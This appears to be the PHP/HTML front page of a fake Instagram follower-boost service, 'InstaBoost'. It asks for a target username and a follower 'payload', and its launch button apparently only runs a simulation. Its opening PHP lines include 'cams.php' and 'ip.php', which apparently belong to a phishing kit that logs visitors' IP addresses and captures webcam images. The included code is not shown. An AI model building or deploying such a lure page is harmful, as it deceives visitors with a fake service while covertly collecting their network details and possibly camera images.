<?php
    include 'cams.php';
    include 'ip.php';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaBoost — Neural Growth Engine</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;900&family=Space+Mono:wght@400;700&family=Rajdhani:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Animated Background -->
    <canvas id="particles"></canvas>
    <div class="grid-overlay"></div>
    <div class="scanline"></div>

    <div class="container">

        <!-- Left decorative bar -->
        <div class="deco-bar left-bar">
            <span class="bar-label">SYS</span>
            <div class="bar-line"></div>
            <span class="bar-label">ONLINE</span>
        </div>

        <!-- Main card -->
        <div class="card">

            <!-- Header -->
            <div class="card-header">
                <div class="logo-ring">
                    <svg class="ring-svg" viewBox="0 0 120 120">
                        <circle cx="60" cy="60" r="52" class="ring-track"/>
                        <circle cx="60" cy="60" r="52" class="ring-progress"/>
                    </svg>
                    <div class="logo-icon">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="2" y="2" width="20" height="20" rx="6" stroke="currentColor" stroke-width="1.5"/>
                            <circle cx="12" cy="12" r="4" stroke="currentColor" stroke-width="1.5"/>
                            <circle cx="17.5" cy="6.5" r="1.2" fill="currentColor"/>
                        </svg>
                    </div>
                </div>
                <div class="brand-text">
                    <h1>INSTA<span>BOOST</span></h1>
                    <p class="tagline">NEURAL GROWTH ENGINE <span class="version">v3.7</span></p>
                </div>
                <div class="status-indicator">
                    <span class="dot"></span>
                    <span class="status-label">LIVE</span>
                </div>
            </div>

            <!-- Stats row -->
            <div class="stats-row">
                <div class="stat">
                    <span class="stat-val">2.4M</span>
                    <span class="stat-key">DEPLOYED</span>
                </div>
                <div class="stat-divider"></div>
                <div class="stat">
                    <span class="stat-val">99.8%</span>
                    <span class="stat-key">SUCCESS</span>
                </div>
                <div class="stat-divider"></div>
                <div class="stat">
                    <span class="stat-val">0.3s</span>
                    <span class="stat-key">AVG PING</span>
                </div>
            </div>

            <!-- Input section -->
            <div class="form-section">
                <div class="input-wrapper">
                    <label class="field-label">TARGET HANDLE</label>
                    <div class="input-field">
                        <span class="input-prefix">@</span>
                        <input type="text" id="username" placeholder="username" autocomplete="off" spellcheck="false">
                        <div class="input-glow"></div>
                    </div>
                </div>

                <div class="slider-wrapper">
                    <div class="slider-header">
                        <label class="field-label">PAYLOAD SIZE</label>
                        <span class="slider-val"><span id="val">5,000</span> <span class="unit">UNITS</span></span>
                    </div>
                    <div class="slider-track-wrap">
                        <input type="range" min="100" max="10000" value="5000" id="followerRange">
                        <div class="slider-fill" id="sliderFill"></div>
                        <div class="slider-markers">
                            <span>100</span>
                            <span>2.5K</span>
                            <span>5K</span>
                            <span>7.5K</span>
                            <span>10K</span>
                        </div>
                    </div>
                </div>

                <!-- Protocol selection -->
                <div class="protocol-row">
                    <label class="field-label">PROTOCOL</label>
                    <div class="protocol-options">
                        <button class="proto-btn active" data-proto="STEALTH">STEALTH</button>
                        <button class="proto-btn" data-proto="RAPID">RAPID</button>
                        <button class="proto-btn" data-proto="GHOST">GHOST</button>
                    </div>
                </div>
            </div>

            <!-- CTA Button -->
            <button class="launch-btn" onclick="startSimulation()" id="launchBtn">
                <span class="btn-bg"></span>
                <span class="btn-content">
                    <svg class="btn-icon" viewBox="0 0 24 24" fill="none">
                        <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/>
                    </svg>
                    INITIALIZE UPLINK
                </span>
                <span class="btn-corner tl"></span>
                <span class="btn-corner tr"></span>
                <span class="btn-corner bl"></span>
                <span class="btn-corner br"></span>
            </button>

            <!-- Status terminal -->
            <div id="status-box" class="terminal hidden">
                <div class="terminal-header">
                    <span class="term-dot red"></span>
                    <span class="term-dot yellow"></span>
                    <span class="term-dot green"></span>
                    <span class="term-title">SYS_TERMINAL</span>
                </div>
                <div class="terminal-body">
                    <div class="term-line"><span class="prompt">❯</span> <span id="status-text">Initializing...</span><span class="cursor">█</span></div>
                    <div id="term-log"></div>
                </div>
                <div class="progress-bar-wrap">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
            </div>

        </div>

        <!-- Right decorative bar -->
        <div class="deco-bar right-bar">
            <span class="bar-label">NET</span>
            <div class="bar-line"></div>
            <span class="bar-label">SEC</span>
        </div>

    </div>

    <script src="script.js"></script>
</body>
</html>
